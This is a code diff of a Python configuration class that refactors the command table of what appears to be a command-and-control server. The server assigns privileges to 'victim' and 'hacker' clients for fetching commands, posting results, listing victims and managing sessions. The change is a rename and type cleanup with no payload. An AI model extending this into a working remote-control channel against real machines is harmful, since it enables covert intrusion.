@@ -48,41 +48,41 @@ class Config:
         # to each command.
 
         self.server_cmd_privileges = {
-            ut.ServerCommands.register: [
+            ut.ServerCommand.register: [
                 ut.ClientType.victim,
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.fetch_cmd: [
+            ut.ServerCommand.fetch_cmd: [
                 ut.ClientType.victim,
             ],
-            ut.ServerCommands.post_res: [
+            ut.ServerCommand.post_res: [
                 ut.ClientType.victim,
             ],
-            ut.ServerCommands.post_cmd: [
+            ut.ServerCommand.post_cmd: [
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.fetch_res: [
+            ut.ServerCommand.fetch_res: [
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.create_session: [
+            ut.ServerCommand.create_session: [
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.get_session: [
+            ut.ServerCommand.get_session: [
                 ut.ClientType.victim,
             ],
-            ut.ServerCommands.list_victims: [
+            ut.ServerCommand.list_victims: [
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.exit_session: [
+            ut.ServerCommand.exit_session: [
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.delete_hacker: [
+            ut.ServerCommand.delete_hacker: [
                 ut.ClientType.hacker,
             ],
         }
 
-        self.server_cmds = {
-            self.get_server_cmd_id(cmd): cmd for cmd in self.server_cmd_privileges
+        self.server_cmd_endpoints: dict[ut.ServerCommand, str] = {
+            cmd: self.get_server_cmd_id(cmd) for cmd in ut.ServerCommand
         }
 
         # ---- Python and response type map
@@ -168,10 +168,10 @@ class Config:
             DefaultCLIArgumentValues.client_idle_duration,
         )
 
-    def get_server_cmd_id(self, cmd: str):
+    def get_server_cmd_id(self, cmd: ut.ServerCommand):
         """Get the server command from the profiles."""
         fallback = f"/{ut.generate_token()[:8]}"
-        return self._get_profile_field(cmd, None, fallback, "server_commands")
+        return self._get_profile_field(cmd.value, None, fallback, "server_commands")
 
     def get_token(self, token_name: str):
         """Get the token using the token_name if the token doesn't exist then insert it."""
